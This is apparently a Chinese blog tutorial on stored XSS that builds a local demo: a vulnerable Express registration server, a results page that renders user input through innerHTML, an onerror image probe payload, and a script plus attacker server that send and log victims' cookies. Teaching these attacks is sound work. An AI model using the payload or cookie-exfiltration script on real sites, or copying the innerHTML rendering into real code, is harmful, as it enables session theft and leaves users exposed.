---
tags: ['网络安全', '面试问题 - 网络']
date: '10.24.2019'
---

# XSS 攻击 - 存储型

> Posted: 10.24.2019

<Tag />

## 存储型 XSS 的特点

存储型 XSS，也叫持久型 XSS。

主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。）。

然后在下次请求页面的时候就不用带上XSS代码了

最典型的就是留言板XSS：

1. 用户提交了一条包含XSS代码的留言到数据库
2. 当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来
3. 浏览器发现有XSS代码，就当做正常的HTML和JS解析执行
4. XSS攻击就发生了

![xss-stored](/xss-stored.png)

和反射型 XSS 攻击不同的是，<span v-red>**存储型 XSS 直接攻击了具有漏洞的网站本身！**</span>

因为它在数据库里注入了恶意的内容！（当然，最后付出代价的还是用户自己）

## 代码模拟

### 被攻击的服务器

首先我们起一个普通的 node 服务器，作为被攻击的网站服务器。

这个服务器很简单，就是注册用户，然后将用户的邮箱存储到数据库里。

当然，我们这里就不搞真的数据库了，就用内存暂时代替一下。

<span v-line>别问为什么不用 localStorage，localStorage 是 H5 的特性，服务器没有。</span>

```javascript
const express = require("express");
const bodyParser = require("body-parser");
const path = require('path');

const app = express();

// 直接用内存当数据库了
const db = [];

app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));
app.use(bodyParser.json({ extended: true, limit: "50mb" }));

app.use(express.static("./xss-stored.html"));
app.use(express.static("./xss-stored-result.html"));

app.get("/index", (req, res) => {
  res.sendFile(path.join(__dirname, './xss-stored.html'));
});

app.get("/result", (req, res) => {
  res.sendFile(path.join(__dirname, './xss-stored-result.html'));
});

app.get("/users", (req, res) => {
  res.status(200).json(db);
});

app.post("/register", (req, res) => {
  const { username, email } = req.body;
  db.push({ username, email });
  res.status(200).end('success!');
});

app.listen(8081, () => console.log("SB server running on port 8081"));
```

### 被攻击的客户端

前端就是用来展示搜索的结果

注册页面：

```html
<body>
  <div class="container">
    <form id="myform">
      用户名： <input type="text" placeholder="username..." id="username" /><br />
      邮箱： <input type="text" placeholder="email..." id="email" /><br /><br />
      <button class="submit-btn">注册</button>
    </form>
  </div>
  <script>
    // 绑定表单的提交
    document.querySelector(".submit-btn").addEventListener('click', (e) => {
      e.preventDefault();
      var username = document.querySelector('#username').value;
      var email = document.querySelector('#email').value;
      var data = { username, email };

      var xhr = new XMLHttpRequest();
      xhr.open('post', '/register', true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify(data));

      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
          window.location.href = '/result';
        }
      }
    });
  </script>
</body>
```

注册成功后跳转到结果页面：

```html
<body>
  <div class="result"></div>
  <script>
    // 原生 AJAX 方法
    var xhr = new XMLHttpRequest();
    xhr.open('get', `http://localhost:8081/users`, true);
    xhr.send();
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        var users = JSON.parse(xhr.responseText);
        users.forEach(user => {
          var div = document.createElement('div');
          var text = '用户名：' + user.username + '，邮箱：' + user.email;
          div.innerHTML = text;
          document.querySelector('.result').appendChild(div);
        });
      }
    }
  </script>
</body>
```

最终实现的效果是这样的：

![xss-stored-pro](/xss-store-pro.gif)

### 攻击者寻找目标

攻击者这个时候会注册 `<img src=null onerror="alert('sb')" />` 这个字符串

能够帮助攻击者定位的，就是在结果页面，攻击代码被执行。

![xss stored attack](/xss-stored-attack.gif)

这个时候，攻击已经开始了，攻击者可以进行一些大胆的想法了。

### 开始攻击

和反射型 XSS 不一样，存储型 XSS 不需要发送任何邮件。

只要用户进入到 `localhost:8081/result` 这个页面，就会被攻击。

### 攻击者的攻击脚本

和反射型 XSS 一样，一般来说，就是获取 cookie 并且发送到后台。

但其实能做的事情多了。这里就不一一列举了。

```javascript
// 原生 AJAX 方法
var xhr = new XMLHttpRequest();
xhr.open('get', `http://localhost:8082/attack?q=${document.cookie}`, true);
xhr.send();
xhr.onreadystatechange = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    /**
     * 傻逼才会在这里显示攻击成功
     * 我这仅仅出于说明的目的
     */
    console.log('攻击成功！');
  }
}
```

### 攻击者的服务器

然后我们起一个攻击者的服务器，用来处理用户发送的数据。

攻击者的服务器很简单，就是接收请求，然后读取 query string 里面的 cookie 信息。

```javascript
const express = require("express");
const path = require('path');
const app = express();

app.use(express.static("./attack.js"));

app.get("/danger", (req, res) => {
  res.sendFile(path.join(__dirname, './attack.js'));
});

app.get("/attack", (req, res) => {
  // 从 query string 上拿到被攻击者的 cookie
  const { q } = req.query;
  console.log(q);
  res.status(204).end();
});

app.listen(8082, () => console.log("Attacker running on port 8082"));
```

### 结果

当用户进入 result 页面时，我们成功地获取到了他的 cookie

![xss-stored-attack-result](/xss-stored-attack-result.png)

## 参考资料

[前端安全之XSS攻击](https://www.cnblogs.com/unclekeith/p/7750681.html)

[What is Cross Site Scripting (XSS) ?](https://www.geeksforgeeks.org/what-is-cross-site-scripting-xss/)

<Disqus />